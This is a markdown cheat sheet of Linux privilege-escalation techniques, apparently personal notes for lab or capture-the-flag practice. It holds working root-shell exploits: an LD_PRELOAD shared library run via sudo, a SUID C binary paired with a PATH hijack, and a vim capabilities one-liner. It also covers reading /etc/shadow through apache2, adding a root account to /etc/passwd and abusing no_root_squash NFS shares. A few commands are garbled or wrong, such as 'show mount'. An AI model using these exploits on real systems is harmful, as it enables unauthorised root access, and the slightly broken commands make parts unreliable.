# Linux PrivEsc

## Leverage Application Functions
You may be able to use installed applications to gain access to configuration files.

Specify an alternate configuration file. This will error out, but reveal the first line of the shadow file:
```sh
apache2 -f  /etc/shadow
```

## Leverage LD_PRELOAD
A program that allows any programs to use shared libraries. If the `env_keep` option is enabled we can generate our own shared library that will be loaded and executed before the program is run.

Note: `LD_PRELOAD` will be ignored if the real userID != effective userID

### Example Exploit

shell.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Compile:
```sh
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Run the program by specifying `LD_PRELOAD`
```sh
sudo LD_PRELOAD=/home/user/lbpreload/shell.so find
```

## SUID
If a binary exists we with the SUID bit set, we may be able to use [GTFOBins](https://gtfobins.github.io)

Find all files with SUID set:
```sh
find / -type f -perm -04000 -ls 2>/dev/null
```

## Edit /etc/passwd
You may be able to add your own user account to the file.

Generate hash:
```sh
openssl passwd -1 -salt ANYTHING MYPASSWORD

username:<HASH>:0:0:root:/root:/bin/bash
```

## Capabilities
Help manage privileges at a granualor level. Alters binaries to provide functionality without the permissions.

List capabilities:
```sh
getcap -r / 2>/dev/null
```

Exploit VIM
```sh
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## PATH
An environmental variable that tells the os where to search for executables.

    1. Do you have write permissions on any folders?
    2. Can you modify the `PATH`
    3. Can you start a script / application?

Set PATH:
```sh
export PATH=/tmp:$PATH
```

Find writeable files:
```sh
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

### Exploit

1. Create a script to launch a system binary (test). Not quite sure why I need the syntax too look like that, but doesn't seem to work otherwise.

example.c
```c
#include <unistd.h>

void main()
{ setuid(0);
setgid(0);
system("/bin/bash");
return 0;
}
```

Complie & Permissions
```c
gcc example.c -o exploit -w
chmod u+s exploit
```

2. Place script in a writeable location:
```c
echo "/bin/bash" > /tmp/test
chmod 7777 /tmp/test
```

## NFS
Network File sharing configuration is kept in `/etc/exports` and created during server installation.

no_root_squash:
- NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If `no_root_squash` is present on a writable share we can create an executable with the `SUID` bit set.

Attacking Machine
```sh
show mount -e

mkdir /tmp/mymountname
mount -o rw 10.10.10.10:/target /tmp/mymountname
```
